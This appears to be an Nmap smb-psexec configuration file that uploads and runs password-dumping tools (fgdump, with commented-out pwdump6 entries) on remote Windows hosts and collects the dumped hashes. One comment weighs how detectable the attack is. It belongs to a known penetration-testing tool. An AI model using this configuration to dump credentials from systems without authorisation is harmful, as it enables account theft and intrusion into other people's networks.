---This config file is designed for running password-dumping scripts. So far,
-- it supports pwdump6 2.0.0 and fgdump.
--
-- Note that none of these modules are included with Nmap by default.

-- Any variable in the 'config' table in smb-psexec.nse can be overriden in the
-- 'overrides' table. Most of them are not really recommended, such as the host,
-- key, etc.
overrides = {}
--overrides.timeout = 40

modules = {

--{
--upload           = true,
--name             = "PwDump6 2.0.0",
--program          = "PwDump.exe",
--args             = "localhost",
--maxtime          = 10,
--include_stderr   = false,
--url              = "http://www.foofus.net/fizzgig/pwdump/",
--},

---Uncomment if you'd like to use PwDump6 1.7.2 (considered obsolete, but still works).
-- Note that for some reason, this and 'fgdump' don't get along (fgdump only produces a blank
-- file if these are run together)
--{
--upload           = true,
--name             = "PwDump6 1.7.2",
--program          = "PwDump-1.7.2.exe",
--args             = "localhost",
--maxtime          = 10,
--include_stderr   = false,
--extrafiles       = {"servpw.exe", "lsremora.dll"},
--url              = "http://www.foofus.net/fizzgig/pwdump/",
--},

  -- Warning: the danger of using fgdump is that it always write the output to the harddrive unencrypted;
  -- this makes it more obvious that an attack has occurred.
  {
    upload           = true,
    name             = "FgDump",
    program          = "fgdump.exe",
    args             = "-c -l fgdump.log",
    maxtime          = 10,
    url              = "http://www.foofus.net/fizzgig/fgdump/",
    tempfiles        = {"fgdump.log"},
    outfile          = "127.0.0.1.pwdump",
  },
}
